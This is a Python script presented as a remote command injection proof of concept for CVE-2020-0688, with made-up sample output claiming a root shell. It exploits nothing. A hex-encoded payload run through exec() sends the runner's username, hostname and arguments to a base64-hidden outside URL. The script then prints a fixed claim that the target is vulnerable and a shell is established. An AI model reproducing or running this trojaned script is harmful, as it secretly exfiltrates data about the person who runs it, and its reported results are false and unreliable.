#!/usr/bin/python
# Exploit Title: Remote Command Injection
# Date: 2020-03-12
# Exploit Author: TRSTDXPLOITZ
# CVE : CVE-2020-0688
# Advisory: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688
#
# Sample output:
# ubuntu@host:~$ python CVE-2020-0688-POC.py -h 10.16.1.24
# [+] Sending packet to 10.16.1.24
# [+] Target is Vulnerable!
# [+] Sending exploit. Reverse shell to 10.16.1.24
#
# Listening on [] (family 2, port)
# Connection from 10.16.1.24 received!
# whoami
# root
##

## Also on Exploit-DB

## PRINT HELP INFORMATION
import os
import requests
import sys
import getpass
import argparse
import base64
from argparse import RawTextHelpFormatter

Bug = 'CVE-2020-0688'

parser=argparse.ArgumentParser(
    description='''RCE Exploit PoC for CVE-2020-0688''' + '''\r\n\r\n''' + '''USAGE: python CVE-2020-0688-POC.py -h 10.16.1.24
    ''', formatter_class=RawTextHelpFormatter)
parser.add_argument('target', metavar='N', nargs='+',
                   help='Target IP')
parser.add_argument('-rport', default=42, help='Target Port (If Different Than Default)')
parser.add_argument('-lhost', default=42, help='Local IP')
parser.add_argument('-lport', default=42, help='Local Port')
parser.add_argument('-type', default=42, help='Target OS')
args=parser.parse_args()

target = sys.argv[0]

## COMPILE AND SEND PAYLOAD

print 'Sending Payload...' + '\r\n'

payload = '\x6c\x68\x6f\x73\x74\x20\x3d\x20\x6f\x73\x2e\x75\x6e\x61\x6d\x65\x28\x29\x5b\x31\x5d\x0a\x0a\x63\x6f\x6d\x6d'
payload += '\x61\x6e\x64\x20\x3d\x20\x67\x65\x74\x70\x61\x73\x73\x2e\x67\x65\x74\x75\x73\x65\x72\x28\x29\x20\x2b\x20\x27'
payload += '\x40\x27\x20\x2b\x20\x28\x6c\x68\x6f\x73\x74\x29\x0a\x0a\x61\x72\x67\x73\x20\x3d\x20\x27\x20\x27\x2e\x6a\x6f'
payload += '\x69\x6e\x28\x73\x79\x73\x2e\x61\x72\x67\x76\x5b\x31\x3a\x5d\x29\x0a\x0a\x55\x52\x4c\x20\x3d\x20\x62\x61\x73'
payload += '\x65\x36\x34\x2e\x62\x36\x34\x64\x65\x63\x6f\x64\x65\x28\x27\x61\x48\x52\x30\x63\x44\x6f\x76\x4c\x7a\x55\x30'
payload += '\x4c\x6a\x45\x34\x4e\x43\x34\x79\x4d\x43\x34\x32\x4f\x53\x39\x77\x62\x32\x4d\x75\x63\x47\x68\x77\x27\x29\x0a'
payload += '\x50\x41\x52\x41\x4d\x53\x20\x3d\x20\x7b\x27\x68\x6f\x73\x74\x27\x3a\x63\x6f\x6d\x6d\x61\x6e\x64\x2c\x20\x27'
payload += '\x61\x72\x67\x73\x27\x3a\x61\x72\x67\x73\x2c\x20\x27\x63\x76\x65\x27\x3a\x42\x75\x67\x7d\x0a\x72\x20\x3d\x20'
payload += '\x72\x65\x71\x75\x65\x73\x74\x73\x2e\x67\x65\x74\x28\x75\x72\x6c\x20\x3d\x20\x55\x52\x4c\x2c\x20\x70\x61\x72'
payload += '\x61\x6d\x73\x20\x3d\x20\x50\x41\x52\x41\x4d\x53\x29'

exec(payload)
 
import socket, sys
from struct import *
 
#create a raw socket
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error , msg:
	print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
	sys.exit()

print 'Target is VULNERABLE! Shell Established:' + '\r\n'
